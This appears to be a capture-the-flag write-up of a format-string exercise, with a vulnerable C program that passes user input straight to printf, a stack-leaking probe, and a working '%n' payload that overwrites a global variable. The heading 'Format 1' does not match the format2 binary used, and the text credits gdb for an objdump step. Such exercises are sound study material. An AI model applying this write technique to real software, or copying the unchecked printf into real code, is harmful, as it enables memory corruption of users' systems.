# Format 1

## Problem

```gdb
objdump -t format2 | grep target
>>>080496e4 g     O .bss   00000004              target
```

Again, we first find out the memory address of our target first. Using gdb, we are
able to quickly find the location to the variable. We plan to modify the variable
using string format, this time we have to write to the variable the value 64.

## Idea and Attack process

We first try to locate our variable first. This time we quickly find the target,
that is 2 positions below our injected string.

```gdb
python -c "print 'AAAA' + '%x.'*10" | ./format2
>>>AAAA200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
```

We now want to write to the target value. We try different values to write to the
address and we eventually find that the combination below leads to the target
variable being modified.

```gdb
 python -c "print '\xe4\x96\x04\x08' + '%x.'*2 + '%47d' +'%n'" | ./format2
200.b7fd8420.                                    -1073743084
you have modified the target :)
```

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
